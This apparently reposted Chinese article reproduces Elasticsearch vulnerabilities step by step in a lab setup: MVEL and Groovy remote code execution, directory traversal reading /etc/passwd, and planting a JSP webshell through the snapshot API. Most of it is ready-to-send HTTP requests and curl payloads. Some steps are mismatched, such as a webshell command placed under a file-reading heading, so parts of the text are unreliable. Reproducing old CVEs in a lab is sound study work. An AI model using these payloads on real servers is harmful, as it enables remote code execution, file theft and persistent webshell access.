> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YcVXeGnbrxhtVXH7VG0PEA)

**Elasticsearch 简介**

Elasticsearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 语言开发的，并作为 Apache 许可条款下的开放源码发布，是一种流行的企业级搜索引擎。  

Elasticsearch 用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在 Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby 和许多其他语言中都是可用的。根据 DB-Engines 的排名显示，Elasticsearch 是最受欢迎的企业搜索引擎，其次是 Apache Solr，也是基于 Lucene。由于 Elasticsearch 的功能强大和使用简单，维基百科、卫报、Stack Overflow、GitHub 等都纷纷采用它来做搜索。现在，Elasticsearch 已成为全文搜索领域的主流软件之一。

**ElasticSearch 命令执行漏洞（CVE-2014-3120）**

**漏洞原理：**

老版本 ElasticSearch 支持传入动态脚本（MVEL）来执行一些复杂的操作，而 MVEL 可执行 Java 代码，而且没有防护或者沙盒包装，所以我们可以直接执行任意代码。

**影响版本：**

ElasticSearch 1.2 之前的版本

**漏洞复现：**

首先，该漏洞需要 es 中至少存在一条数据，所以我们需要先创建一条数据

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "phithon"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOAr69o2FM4VBmrIbN0ICkibdWqjFSIKgMbvLDStRicVsPjaZF9aqRpibLg/640?wx_fmt=png)

然后，执行任意代码

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343


{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCO6Xcy4Z97Qyp0UFZjenG6ttAgRmN7S8zGo5yWicVSntIvb9aroQQDIkw/640?wx_fmt=png)

**ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞（CVE-2015-1427)**

**漏洞原理**

CVE-2014-3120 后，ElasticSearch 默认的动态脚本语言换成了 Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。Groovy 是一款开发语言，这意味着我们完全可以在不使用 Java 的前提下实现代码执行。如果仅仅是沙盒的问题，那么修补黑白名单到攻击者没办法绕过沙盒使用 Java 反射就好了，但是一种语言要怎么靠黑白名单来限制它的绝大部分功能？所以没有把 Groovy 当做一种编程语言是这问题的真正原因。

本漏洞：1. 是一个沙盒绕过；2. 是一个 Goovy 代码执行漏洞。  

Groovy 语言 “沙盒”

ElasticSearch 支持使用 “在沙盒中的”Groovy 语言作为动态脚本，但显然官方的工作并没有做好。lupin 和 tang3 分别提出了两种执行命令的方法：

1.  既然对执行 Java 代码有沙盒，lupin 的方法是想办法绕过沙盒，比如使用 Java 反射
    
2.  Groovy 原本也是一门语言，于是 tang3 另辟蹊径，使用 Groovy 语言支持的方法，来直接执行命令，无需使用 Java 语言
    

所以，根据这两种执行漏洞的思路，我们可以获得两个不同的 POC。

**Java 沙盒绕过法：**

java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getText()

**Goovy 直接执行命令法：**

def command='whoami';def res=command.execute().text;res

**漏洞复现**

由于查询时至少要求 es 中有一条数据，所以发送如下数据包，增加一个数据：

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25


{
  "name": "test"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCO3YqLfttP4Sb1xfeznz0fazho8C9LnDG86Ib7fzIMNrz8OibyWD3nibdg/640?wx_fmt=png)

然后发送包含 payload 的数据包，执行任意命令：

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156




{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOJGAwMkYiakeYGzxsMicDZVzER5j5FRXmVmGJaYAVoegpoEUCTrTyZa2A/640?wx_fmt=png)

**ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）**

**漏洞原理**

在安装了具有 “site” 功能的插件以后，插件目录使用../ 即可向上跳转，导致目录穿越漏洞，可读取任意文件。

没有安装任意插件的 elasticsearch 不受影响。

**影响版本**

ElasticSearch 1.4.5 以下 / 1.5.2 以下

**漏洞复现**

查看所有已安装的插件：/_cat/plugins

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOjosFnw6rsazbmCzKBjHkUlKxic6GPKpplPnGwu7ClD04Ytg01RliaWuA/640?wx_fmt=png)

测试环境默认安装了一个插件：elasticsearch-head

head 插件
-------

head 插件提供了 elasticsearch 的前端页面，访问：http://your-ip:9200/_plugin/head/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOic0nMYic5IH8QSIGJZveRiapbBLZw1mVqL1S4WcoHKhGCgH0SdcNyPSicQ/640?wx_fmt=png)

读取任意文件（不要在浏览器访问）：

访问

```
PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108




{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test" 
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOKiaiaBKtdNKJDpjibP2dAdXPdaY6w5rIsMaxoiaSDXaTzo0UovkwpsuLrA/640?wx_fmt=png)

**ElasticSearch 目录穿越漏洞（CVE-2015-5531）**

**漏洞原理**

elasticsearch 1.5.1 及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件 elasticsearch.yml 中必须存在 path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。

**影响版本**

ElasticSearch 1.6.1 以下  

**漏洞复现**

先说说 elasticsearch 的备份与快照功能

漏洞利用需要涉及到 elasticsearch 的备份功能，elasticsearch 提供了一套强大的 API，使得 elasticsearch 备份非常简单

要实现备份功能。前提是 elasticsearch 进程对备份目录有写入权限，一般来说我们可以利用 / tmp 或者 elasticsearch 自身的安装目录，默认情况下这两个目录 elasticsearch 进程都是有写入权限的

1. 新建一个仓库

```
PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108




{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOgibBAF1vEn39xV0Koia2hKXOqOAUYcPZJB3dSuc7hSxgz6qWS2swA7sQ/640?wx_fmt=png)

2. 创建一个快照

```
http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOpXgTkibJDGLmEzKAdLsdl9kTf4P8pTaHnouw5L1ZteVh2dHqAdUzSjA/640?wx_fmt=png)

3. 目录穿越读取任意文件

访问

```
curl -XPOST your-ip:9200/yz.jsp/yz.jsp/1 
-d' {"<%new java.io.RandomAccessFile(application.getRealPath
(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new 
String(new byte[]{114,119})).write(request.getParameter(new String
(new byte[]{102})).getBytes());%>":"test"} '
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCO1WoqBJ5NbUN2yasTFCIXHGqSov8ibj8Tj0Z14nKqQSe1DK3ZZczfIgA/640?wx_fmt=png)

如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCO7xh08sFHIKTCCzmU9dcibc1uVHYFMMv4JzesUojWwAwr2BOaK13wklA/640?wx_fmt=png)

**Elasticsearch 写入 webshell 漏洞（WooYun-2015-110216）**

**漏洞原理**

ElasticSearch 具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。

所以，如果同文件系统下还跑着其他服务，如 Tomcat、PHP 等，我们可以利用 ElasticSearch 的备份功能写入一个 webshell。

和 CVE-2015-5531 类似，该漏洞和备份仓库有关。在 elasticsearch1.5.1 以后，其将备份仓库的根路径限制在配置文件的配置项`path.repo`中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web 路径如果不在该目录下，也无法写入 webshell。所以该漏洞影响的 ElasticSearch 版本是 1.5.x 以前。

**影响版本**

ElasticSearch 1.5.x 之前

简单介绍一下本测试环境。本测试环境同时运行了 Tomcat 和 ElasticSearch，Tomcat 目录在 / usr/local/tomcat，web 目录是 / usr/local/tomcat/webapps；ElasticSearch 目录在 / usr/share/elasticsearch。  

我们的目标就是利用 ElasticSearch，在 / usr/local/tomcat/webapps 目录下写入我们的 webshell。

**首先创建一个恶意索引文档：**

```
curl -XPUT 'your-ip:9200/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOWvWT9RnmNGicCibMtA89m3OyG0FZfjWtI2CyticQjg11icwHTkWY4Yb4tQ/640?wx_fmt=png)

**再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。**

这个 Repositories 的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了 tomcat 的 web 部署目录，因为只要在这个文件夹创建目录 Tomcat 就会自动创建一个新的应用 (文件名为 wwwroot 的话创建出来的应用名称就是 wwwroot 了)。

```
curl -XPUT "your-ip:9200/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCONPcQ9T7szwydu2V7I6F3boZ35eHftpIdP5C60Cv8xufca4hDXhl1eQ/640?wx_fmt=png)

**存储库验证并创建:**  

```
curl -XPUT "your-ip:9200/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

访问

http://your-ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp

这就是我们写入的 webshell。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOXBIuOEwtSQ0bRv9A2Wgzxib2wXmlYa617ibwS5Z0Cjngfhg5WcUt9ichQ/640?wx_fmt=png)

该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符串

如：

http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=fish，我们再访问 / wwwroot/test.jsp 就能看到 fish 了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCOwxnqdnvdobQGyVYtar7GEkuNqib88qCg7718WWYR6sj7oMjGicyj2ogQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDE0dV1xEyw9ZBj4bSUocCONzzHY5hicGb9rflLtgLiaauWxeje5hIP4AQmrVxwMzTlZKibhxEywXQ7w/640?wx_fmt=png)